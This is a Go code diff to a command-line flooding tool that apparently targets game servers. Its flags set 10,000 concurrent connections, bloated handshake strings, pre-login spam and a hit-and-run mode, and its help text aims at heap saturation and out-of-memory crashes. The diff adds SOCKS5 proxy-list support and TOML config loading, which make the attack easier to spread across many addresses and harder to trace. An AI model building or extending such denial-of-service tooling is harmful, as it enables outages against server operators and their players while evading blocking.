@@ -23,6 +23,8 @@ import (
 	"time"
 
 	"github.com/spf13/cobra"
+	"github.com/spf13/viper"
+	_ "golang.org/x/net/proxy"
 )
 
 var (
@@ -39,6 +41,8 @@ var (
 	prelogin    bool
 	har         bool
 )
+
+var proxyPool []string
 
 var (
 	// joinGate is a shared rate-limiter channel; workers block here before each
@@ -1141,6 +1145,7 @@ promotion from Eden → Old Gen, saturating heap and triggering Full GC / OOM.`,
 }
 
 func init() {
+	initConfig()
 	f := rootCmd.Flags()
 	f.IntP("workers", "w", 10000, "concurrent connections to maintain")
 	f.IntP("bloat-size", "s", 255, "handshake server-address string length (max 255)")
@@ -1153,6 +1158,24 @@ func init() {
 	f.BoolP("login", "l", false, "automatically send /register commands after join")
 	f.Bool("prelogin", false, "enable pre-login spam mode (AsyncPlayerPreLoginEvent)")
 	f.Bool("har", false, "hit-and-run mode: don't wait for server response in pre-login mode")
+	f.StringP("proxies", "p", "", "path to .txt file with SOCKS5 proxies")
+	viper.BindPFlags(f)
+}
+
+func initConfig() {
+	home, err := os.UserHomeDir()
+	if err == nil {
+		viper.AddConfigPath(home)
+	}
+	viper.AddConfigPath(".")
+	viper.SetConfigName("gaslighterc")
+	viper.SetConfigType("toml")
+
+	viper.AutomaticEnv()
+
+	if err := viper.ReadInConfig(); err == nil {
+		// fmt.Println("Using config file:", viper.ConfigFileUsed())
+	}
 }
 
 func main() {
